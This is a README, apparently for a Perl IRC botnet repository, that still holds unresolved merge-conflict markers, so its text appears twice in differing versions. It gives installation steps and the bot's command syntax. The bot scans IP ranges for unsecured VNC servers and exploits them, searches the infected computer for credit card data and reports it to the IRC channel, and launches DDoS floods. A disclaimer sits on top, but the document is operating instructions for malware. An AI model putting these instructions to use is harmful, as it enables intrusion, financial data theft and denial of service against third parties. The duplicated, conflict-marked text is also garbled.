# By using the code in this repository you agree do these terms:
<<<<<<< HEAD
I (The Author) am not responsible for any actions you make with this program.
You will not use this program to commit illegal crimes.
You take entire responsability if you damage your or someone else's computer.

#Description
This code is an IRC BOT that can connect to an IRC server with SSL
The main purpose of this bot is to scan for Open/Unsecured VNC servers.
The bot can also search for credit card informations in the computer that the bot is running.
There is also a DDoS module made in Python, for taking out the target from the network.


# --- How to install ---
 git clone https://github.com/independentcod/PerlIRCSSL_VNCbypass.git
 cd PerlIRCSSL_VNCbypass
=======
# I am not responsible for any actions you make with this program.
# You will not use this program to commit illegal crimes.
# You take entire responsability if you damage your or someone else's computer.
# #### #
# This code is an IRC BOT that can connect to an IRC server with SSL
# The main purpose of this bot is to scan for Open/Unsecured VNC servers.
# The bot can also search for credit card informations in the computer that the bot is running.
# There is also a DDoS module made in Python, for taking out the target from the network.


# --- How to install ---

 git clone https://github.com/independentcod/PerlIRCSSL_VNCbypass.git
# .
 cd PerlIRCSSL_VNCbypass
# .
>>>>>>> 1bd9f276c1bc4c57858532e5222cfaf834f707ad
 chmod +x ./*
# (if using Debian, Kali or Ubuntu) 
 ./debian-installer.sh
# (elseif running CentOS)
 ./centos-installer.sh

<<<<<<< HEAD
# --- COMMANDS ---
#NOTE:The commands can be done via PRIVATE MESSAGE and CHANNEL also.
--this will scan 192.168.0.0/16 CIDR
@.scan 192.168.0.0-192.168.255.255 
---This needs to be done before each @.exploit
@.format 
---This runs the VNC exploit and reports the working VNCs to the channel
@.exploit 
---This kills the exploit run
@.stopexploit 
---This will ddos 127.0.0.1 on port 8080 tcp with 10000 packets in size with 1000 threads
@.ddos 127.0.0.1 8080 n 10000 1000 
---This kills the running ddos, do I even need to explain this?...
@.ddos.stop
---This will scan computer for credit card info and report in the channel.
@.ccplz
---below command is almost useless
@.ping 

# ---NOTE---
In order for bot to work you need to be operator in the channel, it also must be registered with services.
=======
# Follow the step-by-step installation and you are done.

# --- COMMANDS ---
The commands can be done via PRIVATE MESSAGE and CHANNEL also.
# this will scan 192.168.0.0/16 CIDR
@.scan 192.168.0.0-192.168.255.255 
# This needs to be done before each @.exploit
@.format 
# This runs the VNC exploit and reports the working VNCs to the channel
@.exploit 
# This kills the exploit run
@.stopexploit 
# this will ddos 127.0.0.1 on port 8080 tcp with 10000 packets in size with 1000 threads
@.ddos 127.0.0.1 8080 n 10000 1000 
# This kills the running ddos, do I even need to explain this?...
@.ddos.stop
# This will scan computer for credit card info and report in the channel.
@.ccplz
# mehhh
@.ping 

# ---NOTE---

In order for bot to work you need to be operator in the channel,
it also must be registered with services.
>>>>>>> 1bd9f276c1bc4c57858532e5222cfaf834f707ad
# YOU MUST autovoice your bots else you will not get any output in the server.

